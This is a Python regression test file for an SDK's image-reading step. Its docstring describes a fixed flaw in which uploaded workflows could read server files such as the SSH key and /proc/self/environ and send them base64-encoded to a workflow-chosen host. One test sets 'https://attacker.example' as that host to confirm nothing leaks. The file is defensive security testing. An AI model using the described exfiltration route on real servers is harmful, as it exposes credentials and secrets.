"""``VisionStep`` never reads a server-local path (review round 4, 2026-09-26).

Platform-template steps stay in-process in runs that carry uploaded code
(review round 2's per-step lanes), so a ``VisionStep`` runs inside the UMRS
server for workflows any user may upload (ADR-074 Amendment 1). Its image
came from step config, a trigger param or an upstream step's reply, and a
local path there read the server's own files (the cluster SSH key under
``/root/.ssh``, ``/proc/self/environ``) and posted them base64-encoded to a
workflow-chosen ``api_base``; ``/dev/zero`` read until the host OOMed.
"""

from __future__ import annotations

import base64
import io

import pytest
from umrs.pipeline_sdk.step import StepContext
from umrs.pipeline_sdk.templates import vision_step
from umrs.pipeline_sdk.templates.vision_step import VisionStep, _ImageRef
from umrs.server.workflow_runner import _assemble_step_config

SECRET = b"-----BEGIN OPENSSH PRIVATE KEY----- not for the VLM"


class _S3:
    def __init__(self, objects=None, sizes=None):
        self.objects = objects or {}
        self.sizes = sizes or {}
        self.bodies_read = []

    def get_object(self, *, Key, **_):
        if Key not in self.objects and Key not in self.sizes:
            raise KeyError(Key)
        s3 = self

        class _Body:
            def read(self):
                s3.bodies_read.append(Key)
                return s3.objects.get(Key, b"")

        size = self.sizes.get(Key, len(self.objects.get(Key, b"")))
        return {"ContentLength": size, "Body": _Body()}


def _ctx(s3=None, **config) -> StepContext:
    return StepContext(
        s3=s3 if s3 is not None else _S3(),
        input_bucket="alice.p.in",
        input_keys=[],
        output_bucket="alice.p.in-output",
        config=config,
        run_id="wf-0123456789ab",
    )


@pytest.fixture
def secret(tmp_path):
    path = tmp_path / "rccs_key"
    path.write_bytes(SECRET)
    return path


def test_a_local_path_is_never_read(secret):
    ref = _ImageRef.from_value(str(secret), _ctx())
    assert ref.bytes_data is None and ref.path is None
    with pytest.raises(RuntimeError, match="No image bytes"):
        ref.to_data_url()


def test_proc_environ_is_never_read():
    ref = _ImageRef.from_value("/proc/self/environ", _ctx())
    assert ref.bytes_data is None and ref.path is None


def test_a_file_url_is_refused_by_name(secret):
    with pytest.raises(ValueError, match="is a local file"):
        _ImageRef.from_value(f"file://{secret}", _ctx())


def test_an_s3_key_in_the_runs_bucket_still_resolves():
    ref = _ImageRef.from_value("figs/f.png", _ctx(_S3({"figs/f.png": b"\x89PNG"})))
    assert ref.bytes_data == b"\x89PNG" and ref.s3_key == "figs/f.png"


def test_an_oversized_object_is_refused_before_its_body_is_read():
    s3 = _S3(sizes={"huge.png": vision_step.MAX_IMAGE_BYTES + 1})
    ref = _ImageRef.from_value("huge.png", _ctx(s3))
    assert ref.bytes_data is None and s3.bodies_read == []


def test_a_run_never_posts_a_server_file_to_the_workflow_chosen_host(secret, monkeypatch):
    monkeypatch.delenv("UMRS_VISION_MOCK", raising=False)
    monkeypatch.delenv("UMRS_STEP_STAGED", raising=False)
    posted = []

    class _Client:
        def __init__(self, **_):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def post(self, _url, json=None, **_):
            posted.append(json)
            raise RuntimeError("no network in tests")

    import httpx

    monkeypatch.setattr(httpx, "Client", _Client)
    step = VisionStep()
    step.setup({"mode": "dense", "api_base": "https://attacker.example"})
    result = step.run(_ctx(image=str(secret)))
    leaked = base64.b64encode(SECRET).decode()
    assert all(leaked not in str(body) for body in posted)
    assert result.extra["perception"]["meta"]["mock"] is True  # the legacy fallback


@pytest.mark.parametrize("key", ["api_key", "headers", "api_base", "_routing"])
def test_image_param_may_not_name_a_credential_key(key):
    with pytest.raises(ValueError, match="is reserved"):
        VisionStep().setup({"image_param": key})


def test_a_trigger_param_never_chooses_which_key_the_image_is_read_from():
    config = _assemble_step_config(
        {"name": "vision", "config": {"mode": "dense"}},
        {"image_param": "api_key", "image": "figs/f.png"},
    )
    assert "image_param" not in config and config["image"] == "figs/f.png"


def test_the_capped_read_keeps_an_object_without_a_reported_size():
    class _Sizeless(_S3):
        def get_object(self, **_):
            return {"Body": io.BytesIO(b"\x89PNG")}

    assert _ImageRef.from_value("f.png", _ctx(_Sizeless())).bytes_data == b"\x89PNG"
